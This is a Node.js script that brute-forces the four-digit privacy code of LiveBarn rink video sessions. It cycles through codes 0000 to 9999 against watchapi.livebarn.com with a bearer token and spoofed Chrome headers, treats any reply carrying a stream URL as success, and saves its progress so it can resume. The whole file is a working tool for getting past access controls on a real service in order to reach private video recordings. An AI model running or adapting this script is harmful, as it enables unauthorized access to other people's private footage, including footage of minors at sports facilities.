const https = require('follow-redirects').https;
const fs = require('fs');
const path = require('path');

loadEnvFromFile(path.resolve('.env'));
const {bearerToken, dateStart, dateEnd} = resolveUserInputs();

const surfaceId = `2294`; // Unsure when this changes
const feedModeId = `99`; // The actual value seems to be a single digit, but a higher number works too (queries for all Feed Mode IDs)
const delay = 500;
const outputFileName = `output_${formatDateForFilename(dateStart)}.json`;
const outputPath = path.resolve(outputFileName);
const tmpPath = `${outputPath}.tmp`;

const commonOptions = {
  method: 'GET',
  hostname: 'watchapi.livebarn.com',
  headers: {
    'sec-ch-ua-platform': '"Windows"',
    Authorization: `Bearer ${bearerToken}`,
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'User-Agent':
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    Accept: 'application/json',
    DNT: '1',
    'content-type': 'application/json; charset=utf-8',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    host: 'watchapi.livebarn.com',
  },
  maxRedirects: 20,
};

const basePath = `/api/v2.0.0/media/surfaceid/${surfaceId}/feedmodeid/${feedModeId}/begindate/${dateStart}/enddate/${dateEnd}/code/`;

function loadEnvFromFile(envPath) {
  if (!fs.existsSync(envPath)) return;

  const lines = fs.readFileSync(envPath, 'utf8').split(/\r?\n/);
  for (const rawLine of lines) {
    const line = rawLine.trim();
    if (!line || line.startsWith('#')) continue;
    const idx = line.indexOf('=');
    if (idx === -1) continue;

    const key = line.slice(0, idx).trim();
    if (!key || key.startsWith('#')) continue;

    let value = line.slice(idx + 1).trim();
    if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
      value = value.slice(1, -1);
    }

    if (!(key in process.env)) {
      process.env[key] = value;
    }
  }
}

function resolveUserInputs() {
  const token = process.env.LIVEBARN_BEARER_TOKEN;
  const start = process.env.LIVEBARN_DATE_START;
  const end = process.env.LIVEBARN_DATE_END || start;

  if (!token) {
    console.error('Missing LIVEBARN_BEARER_TOKEN. Add it to .env (see .env.example) or your environment.');
    process.exit(1);
  }

  if (!start) {
    console.error('Missing LIVEBARN_DATE_START. Add it to .env (see .env.example) or your environment.');
    process.exit(1);
  }

  return {bearerToken: token, dateStart: start, dateEnd: end};
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function safeParseJSON(raw) {
  try {
    return JSON.parse(raw);
  } catch {
    return null;
  }
}

function formatDateForFilename(raw) {
  const fallback = 'output';
  if (!raw || typeof raw !== 'string') return fallback;

  const parsed = new Date(raw);
  if (!Number.isNaN(parsed.getTime())) {
    const iso = parsed.toISOString().replace(/[:.]/g, '-');
    return iso.replace(/[^0-9A-Za-z_-]/g, '');
  }

  const sanitized = raw.replace(/[^0-9A-Za-z_-]/g, '-').replace(/-+/g, '-');
  const trimmed = sanitized.replace(/^-|-$/g, '');
  return trimmed || fallback;
}

function requestForCode(code) {
  const options = {...commonOptions, path: basePath + code};

  return new Promise((resolve, reject) => {
    const req = https.request(options, res => {
      const chunks = [];
      res.on('data', chunk => chunks.push(chunk));
      res.on('end', () => {
        const raw = Buffer.concat(chunks).toString();

        if (res.statusCode >= 200 && res.statusCode < 300) {
          const json = safeParseJSON(raw);
          if (Array.isArray(json) && json.length === 1 && json[0] && typeof json[0] === 'object') {
            return resolve(json[0]);
          }
          return resolve(null);
        } else {
          //
        }
      });
    });

    req.on('error', err => reject(err));
    req.end();
  });
}

// Atomic write: write to tmp file, fsync, then rename over the final output file
function writeProgressAtomic(obj) {
  const data = JSON.stringify(obj, null, 2);
  const fd = fs.openSync(tmpPath, 'w');
  try {
    fs.writeFileSync(fd, data, 'utf8');
    fs.fsyncSync(fd);
  } finally {
    fs.closeSync(fd);
  }
  fs.renameSync(tmpPath, outputPath);
}

function loadExisting() {
  if (!fs.existsSync(outputPath)) return {};
  try {
    const text = fs.readFileSync(outputPath, 'utf8');
    const json = JSON.parse(text);
    if (json && typeof json === 'object' && !Array.isArray(json)) {
      return json;
    }
  } catch {}
  // If file is corrupt/unexpected, back it up and start fresh
  const backup = outputPath.replace(/\.json$/, `.corrupt.${Date.now()}.json`);
  try {
    fs.copyFileSync(outputPath, backup);
  } catch {}
  return {};
}

function classifyResponse(obj) {
  if (!obj || typeof obj !== 'object') return null;
  if (Object.prototype.hasOwnProperty.call(obj, 'privateSession')) return false;
  if (Object.prototype.hasOwnProperty.call(obj, 'url')) return true;
  return null;
}

(async () => {
  const results = loadExisting();
  let secretCode = '';

  const existingCode = Object.entries(results).find(([key, val]) => val === true);
  if (existingCode) {
    secretCode = existingCode[0];
  }

  for (let i = 0; i <= 9999 && !secretCode; i++) {
    const code = i.toString().padStart(4, '0');

    // Skip codes already saved (lets you resume)
    if (Object.prototype.hasOwnProperty.call(results, code)) {
      continue;
    }

    try {
      const obj = await requestForCode(code);
      const classification = classifyResponse(obj);
      if (typeof classification === 'boolean') {
        results[code] = classification;
      }

      writeProgressAtomic(results);

      if (classification === true) {
        secretCode = code;
        break;
      }
      const numKeysChecked = Object.keys(results).length;
      if (numKeysChecked % 10 === 0) {
        const percentChecked = (numKeysChecked / 10_000) * 100;
        console.log(`${numKeysChecked}/10,000 combinations checked (${percentChecked}%)`);
      }
    } catch (err) {
      results[code] = null;
      writeProgressAtomic(results);
      console.error(`[${code}] error: ${err.message} (progress saved)`);
    }

    if (i < 9999) {
      await sleep(delay);
    }
  }

  if (secretCode) {
    console.log(`Code found: ${secretCode}`);
  }

  console.log(`Checked ${Object.keys(results).length} codes, written to "${outputPath}"`);
})();
